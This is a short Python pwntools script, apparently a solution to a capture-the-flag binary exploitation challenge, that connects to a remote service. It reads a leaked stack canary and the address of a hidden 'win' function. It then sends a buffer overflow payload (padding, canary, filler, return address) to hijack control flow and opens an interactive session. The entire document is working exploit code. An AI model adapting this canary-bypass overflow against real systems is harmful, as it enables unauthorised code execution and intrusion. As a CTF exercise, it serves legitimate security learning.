from pwn import *
context.log_level="debug"

URL="xxx"
p = remote(URL, 39593)

p.recvuntil("inaccessible function at ")
win = int(p.recvuntil('(win)', drop=True), 16)
log.success("win is: "+hex(win))

canary_offset = 24
p.sendlineafter("Input:", "A"*24)
p.recvuntil("\nStack Canary\t\t: ")
canary = int(p.recvuntil('\n', drop=True),16)
log.success("canary is: "+hex(canary))

p.sendlineafter("Your Input:", "Y")
#payload = flat(
#	"A"*24,
#	p64(canary),
#	"A"*8,
#	win,
#)
payload = b"A"*24+p64(canary)+b"C"*8+p64(win)
log.info(payload)
p.sendlineafter(b"Input:", payload)

#p.sendlineafter("Your Input:", "N")

p.interactive()
